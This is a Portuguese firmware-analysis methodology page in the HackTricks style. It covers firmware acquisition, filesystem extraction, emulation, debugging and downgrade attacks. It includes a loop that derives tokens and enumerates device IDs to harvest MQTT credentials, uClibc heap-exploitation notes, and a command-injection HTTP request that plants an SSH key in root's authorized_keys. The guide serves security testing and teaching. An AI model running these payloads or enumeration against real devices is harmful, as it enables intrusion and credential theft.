# Análise de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introdução**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

O firmware é um software essencial que permite que dispositivos funcionem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com o qual os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo tenha acesso a instruções vitais desde o momento em que é ligado, conduzindo ao boot do sistema operacional. Examinar e potencialmente modificar o firmware é um passo crítico para identificar vulnerabilidades de segurança.

## **Coleta de Informações**

A **coleta de informações** é uma etapa inicial crítica para entender a composição de um dispositivo e as tecnologias que ele utiliza. Esse processo envolve reunir dados sobre:

- A arquitetura da CPU e o sistema operacional que ele executa
- Especificações do bootloader
- Layout de hardware e datasheets
- Métricas da base de código e localizações do source
- Bibliotecas externas e tipos de licença
- Históricos de update e certificações regulatórias
- Diagramas arquiteturais e de fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para esse propósito, ferramentas de inteligência de código aberto (OSINT) são inestimáveis, assim como a análise de quaisquer componentes de software open-source disponíveis através de revisões manuais e automatizadas. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) oferecem análise estática gratuita que pode ser aproveitada para encontrar possíveis problemas.

## **Adquirindo o firmware**

Obter o firmware pode ser abordado por vários meios, cada um com seu nível de complexidade:

- **Diretamente** da fonte (desenvolvedores, fabricantes)
- **Construindo** a partir de instruções fornecidas
- **Baixando** de sites de suporte oficiais
- Utilizando consultas **Google dork** para encontrar arquivos de firmware hospedados
- Acessando **cloud storage** diretamente, com ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **updates** via técnicas de man-in-the-middle
- **Extraindo** do dispositivo através de conexões como **UART**, **JTAG**, ou **PICit**
- **Sniffando** por requests de update na comunicação do dispositivo
- Identificando e usando endpoints de update hardcoded
- **Dumping** a partir do bootloader ou da rede
- **Removendo e lendo** o chip de storage, quando tudo mais falhar, usando ferramentas de hardware apropriadas

### UART-only logs: force a root shell via U-Boot env in flash

Se o UART RX for ignorado (apenas logs), você ainda pode forçar um init shell editando o blob de ambiente do U-Boot offline:

1. Faça dump do SPI flash com um SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localize a partição de env do U-Boot, edite `bootargs` para incluir `init=/bin/sh`, e **recompute the U-Boot env CRC32** para o blob.
3. Regrave apenas a partição de env e reinicie; um shell deve aparecer no UART.

Isso é útil em dispositivos embarcados onde o shell do bootloader está desativado mas a partição de env é gravável via acesso externo ao flash.

## Analisando o firmware

Agora que você **tem o firmware**, precisa extrair informações sobre ele para saber como tratá-lo. Diferentes ferramentas que você pode usar para isso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se você não encontrar muito com essas ferramentas verifique a **entropia** da imagem com `binwalk -E <bin>`, se a entropia for baixa, então provavelmente não está criptografada. Se a entropia for alta, provavelmente está criptografada (ou comprimida de alguma forma).

Além disso, você pode usar essas ferramentas para extrair **arquivos incorporados dentro do firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspecionar o arquivo.

### Obtendo o sistema de arquivos

Com as ferramentas comentadas anteriormente como `binwalk -ev <bin>` você deveria ter sido capaz de **extrair o sistema de arquivos**.\
Binwalk geralmente o extrai dentro de uma **pasta nomeada pelo tipo do sistema de arquivos**, que normalmente é um dos seguintes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extração manual do sistema de arquivos

Às vezes, o binwalk **não terá o byte mágico do sistema de arquivos em suas assinaturas**. Nesses casos, use o binwalk para **encontrar o offset do sistema de arquivos e extrair o sistema de arquivos comprimido** do binário e **extrair manualmente** o sistema de arquivos de acordo com seu tipo usando os passos abaixo.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Execute o seguinte **dd command** carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, o seguinte comando também pode ser executado.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos ficarão no diretório "`squashfs-root`" posteriormente.

- Arquivos CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de arquivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de arquivos ubifs com NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisando Firmware

Uma vez que o firmware é obtido, é essencial dissecá-lo para entender sua estrutura e potenciais vulnerabilidades. Esse processo envolve a utilização de várias ferramentas para analisar e extrair dados valiosos da imagem do firmware.

### Ferramentas de Análise Inicial

Um conjunto de comandos é fornecido para inspeção inicial do arquivo binário (referido como `<bin>`). Esses comandos ajudam a identificar tipos de arquivo, extrair strings, analisar dados binários e entender detalhes de partições e do sistema de arquivos:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para avaliar o estado de criptografia da imagem, a **entropia** é verificada com `binwalk -E <bin>`. Baixa entropia sugere ausência de criptografia, enquanto alta entropia indica possível criptografia ou compressão.

Para extrair **arquivos embutidos**, são recomendadas ferramentas e recursos como a documentação **file-data-carving-recovery-tools** e o **binvis.io** para inspeção de arquivos.

### Extraindo o sistema de arquivos

Usando `binwalk -ev <bin>`, normalmente é possível extrair o sistema de arquivos, frequentemente para um diretório nomeado conforme o tipo de sistema de arquivos (por exemplo, squashfs, ubifs). No entanto, quando o **binwalk** não consegue reconhecer o tipo de sistema de arquivos devido à falta de magic bytes, é necessária a extração manual. Isso envolve usar o `binwalk` para localizar o offset do sistema de arquivos, seguido do comando `dd` para recortar (carve) o sistema de arquivos:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Em seguida, dependendo do tipo de sistema de arquivos (por exemplo, squashfs, cpio, jffs2, ubifs), são usados comandos diferentes para extrair manualmente o conteúdo.

### Análise do sistema de arquivos

Com o sistema de arquivos extraído, começa a busca por falhas de segurança. Atenção é dada a daemons de rede inseguros, credenciais hardcoded, endpoints de API, funcionalidades de servidores de update, código não compilado, scripts de inicialização e binários compilados para análise offline.

**Locais-chave** e **itens** a inspecionar incluem:

- **etc/shadow** e **etc/passwd** para credenciais de usuário
- Certificados e chaves SSL em **etc/ssl**
- Arquivos de configuração e scripts em busca de vulnerabilidades potenciais
- Binários embutidos para análise adicional
- Servidores web e binários comuns em dispositivos IoT

Várias ferramentas ajudam a descobrir informações sensíveis e vulnerabilidades dentro do sistema de arquivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis

### Verificações de segurança em binários compilados

Tanto o código-fonte quanto os binários compilados encontrados no sistema de arquivos devem ser examinados em busca de vulnerabilidades. Ferramentas como **checksec.sh** para binários Unix e **PESecurity** para binários Windows ajudam a identificar binários sem proteções que podem ser explorados.

## Coleta de cloud config e credenciais MQTT via tokens de URL derivados

Muitos hubs IoT obtêm sua configuração por dispositivo a partir de um endpoint cloud que se parece com:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante a análise do firmware você pode descobrir que `<token>` é derivado localmente do `<deviceId>` usando um hardcoded secret, por exemplo:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Esse design permite que qualquer um que descubra um deviceId e o STATIC_KEY reconstrua a URL e obtenha o cloud config, frequentemente revelando credenciais MQTT em texto plano e prefixos de tópicos.

Practical workflow:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Procure por linhas imprimindo o padrão de URL do cloud config e o endereço do broker, por exemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY e algoritmo do token do firmware

- Carregue os binários no Ghidra/radare2 e procure pelo caminho de configuração ("/pf/") ou pelo uso de MD5.
- Confirme o algoritmo (por exemplo, MD5(deviceId||STATIC_KEY)).
- Derive o token em Bash e converta o digest para maiúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Extrair cloud config e credenciais MQTT

- Componha a URL e obtenha o JSON com curl; use jq para analisar e extrair segredos:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusar de plaintext MQTT e ACLs de tópico fracas (se presentes)

- Use recovered credentials para subscrever tópicos de manutenção e procurar por eventos sensíveis:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivo previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam bytes vendor OUI/product/type seguidos por um sufixo sequencial.
- Você pode iterar IDs candidatos, derivar tokens e buscar configs programaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Sempre obtenha autorização explícita antes de tentar mass enumeration.
- Prefira emulation ou static analysis para recuperar secrets sem modificar o target hardware quando possível.

O processo de emular firmware permite **dynamic analysis** tanto do funcionamento de um dispositivo quanto de um programa individual. Essa abordagem pode enfrentar desafios por dependências de hardware ou arquitetura, mas transferir o root filesystem ou binários específicos para um dispositivo com arquitetura e endianness compatíveis, como um Raspberry Pi, ou para uma virtual machine pré-construída, pode facilitar testes adicionais.

### Emulando Individual Binaries

Para examinar programas individuais, identificar o endianness e a CPU architecture do programa é crucial.

#### Exemplo com Arquitetura MIPS

Para emular um binary de arquitetura MIPS, pode-se usar o comando:
```bash
file ./squashfs-root/bin/busybox
```
E para instalar as ferramentas de emulação necessárias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), é usado o `qemu-mips`, e para binários little-endian a escolha seria `qemu-mipsel`.

#### Emulação da arquitetura ARM

Para binários ARM, o processo é similar, usando o emulador `qemu-arm` para emulação.

### Emulação de sistema completo

Ferramentas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), e outras, facilitam a emulação completa de firmware, automatizando o processo e auxiliando na análise dinâmica.

## Análise dinâmica na prática

Nesta etapa, um ambiente de dispositivo real ou emulado é usado para análise. É essencial manter acesso shell ao OS e ao filesystem. A emulação pode não reproduzir perfeitamente as interações com o hardware, exigindo reinicializações ocasionais da emulação. A análise deve revisitar o filesystem, explorar páginas web expostas e serviços de rede, e investigar vulnerabilidades do bootloader. Testes de integridade do firmware são críticos para identificar potenciais vulnerabilidades de backdoor.

## Técnicas de análise em tempo de execução

A análise em runtime envolve interagir com um processo ou binário em seu ambiente de execução, usando ferramentas como gdb-multiarch, Frida e Ghidra para definir pontos de interrupção e identificar vulnerabilidades através de fuzzing e outras técnicas.

Para alvos embedded sem um depurador completo, **copie um `gdbserver` estaticamente linkado** para o dispositivo e conecte-se remotamente:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Binary Exploitation and Proof-of-Concept

Desenvolver um PoC para vulnerabilidades identificadas requer um entendimento profundo da arquitetura alvo e programação em linguagens de baixo nível. Proteções em tempo de execução de binários em sistemas embarcados são raras, mas quando presentes, técnicas como Return Oriented Programming (ROP) podem ser necessárias.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc usa fastbins semelhantes aos do glibc. Uma alocação grande posterior pode acionar `__malloc_consolidate()`, portanto qualquer fake chunk deve sobreviver às verificações (tamanho coerente, `fd = 0`, e chunks ao redor vistos como "in use").
- **Non-PIE binaries under ASLR:** se o ASLR estiver habilitado mas o binário principal for **non-PIE**, os endereços `.data/.bss` dentro do binário são estáveis. Você pode mirar em uma região que já se assemelha a um header de chunk de heap válido para posicionar uma alocação fastbin em uma **function pointer table**.
- **Parser-stopping NUL:** quando JSON é parseado, um `\x00` no payload pode interromper o parsing enquanto mantém bytes controlados pelo atacante após ele para um stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** um ROP chain que chama `open("/proc/self/mem")`, `lseek()` e `write()` pode plantar shellcode executável em um mapeamento conhecido e pular para ele.

## Prepared Operating Systems for Firmware Analysis

Sistemas operacionais como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) fornecem ambientes pré-configurados para testes de segurança de firmware, equipados com as ferramentas necessárias.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS é uma distro destinada a ajudar você a realizar security assessment and penetration testing de dispositivos Internet of Things (IoT). Economiza muito tempo ao fornecer um ambiente pré-configurado com todas as ferramentas necessárias carregadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operacional para testes de segurança embarcada baseado no Ubuntu 18.04, pré-carregado com ferramentas para testes de segurança de firmware.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Mesmo quando um vendor implementa verificações de assinatura criptográfica para imagens de firmware, **a proteção contra version rollback (downgrade) é frequentemente omitida**. Quando o boot- ou recovery-loader apenas verifica a assinatura com uma chave pública embutida mas não compara a *versão* (ou um contador monotônico) da imagem que está sendo gravada, um atacante pode legitimamente instalar um **firmware mais antigo e vulnerável que ainda possui uma assinatura válida** e assim reintroduzir vulnerabilidades que haviam sido corrigidas.

Fluxo de ataque típico:

1. **Obtenha uma imagem assinada mais antiga**
* Baixe-a do portal público de downloads do fornecedor, CDN ou site de suporte.
* Extraia-a de aplicações companion mobile/desktop (por exemplo dentro de um Android APK em `assets/firmware/`).
* Recupere-a de repositórios de terceiros como VirusTotal, arquivos da Internet, fóruns, etc.
2. **Envie ou sirva a imagem para o dispositivo** via qualquer canal de atualização exposto:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Muitos dispositivos IoT de consumo expõem endpoints HTTP(S) *unauthenticated* que aceitam blobs de firmware codificados em Base64, decodificam-nos do lado do servidor e acionam recovery/upgrade.
3. Após o downgrade, explore uma vulnerabilidade que foi corrigida na versão mais recente (por exemplo, um filtro de command-injection que foi adicionado depois).
4. Opcionalmente grave a imagem mais recente de volta ou desative atualizações para evitar detecção uma vez que a persistência for alcançada.

### Exemplo: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
No firmware vulnerável (rebaixado), o parâmetro `md5` é concatenado diretamente em um shell command sem sanitização, permitindo a injeção de comandos arbitrários (neste caso – enabling SSH key-based root access). Versões posteriores do firmware introduziram um filtro básico de caracteres, mas a ausência de proteção contra downgrade torna a correção inútil.

### Extraindo Firmware de Apps Móveis

Muitos fabricantes empacotam imagens completas de firmware dentro de seus aplicativos móveis acompanhantes para que o app possa atualizar o dispositivo via Bluetooth/Wi-Fi. Esses pacotes são comumente armazenados sem criptografia no APK/APEX sob caminhos como `assets/fw/` ou `res/raw/`. Ferramentas como `apktool`, `ghidra` ou até mesmo o simples `unzip` permitem extrair imagens assinadas sem tocar no hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista de verificação para avaliar a lógica de atualização

* O transporte/autenticação do *endpoint de atualização* está adequadamente protegido (TLS + autenticação)?
* O dispositivo compara **números de versão** ou um **contador monotônico anti-rollback** antes de gravar?
* A imagem é verificada dentro de uma cadeia de secure boot (ex.: assinaturas verificadas pelo código ROM)?
* O código userland executa verificações adicionais de sanidade (ex.: mapa de partições permitido, número do modelo)?
* Fluxos de atualização *parciais* ou *backup* estão reutilizando a mesma lógica de validação?

> 💡  Se qualquer um dos itens acima estiver faltando, a plataforma provavelmente é vulnerável a ataques de rollback.

## Firmwares vulneráveis para praticar

Para praticar a descoberta de vulnerabilidades em firmware, use os seguintes projetos de firmware vulneráveis como ponto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Treinamento e Certificação

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Referências

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
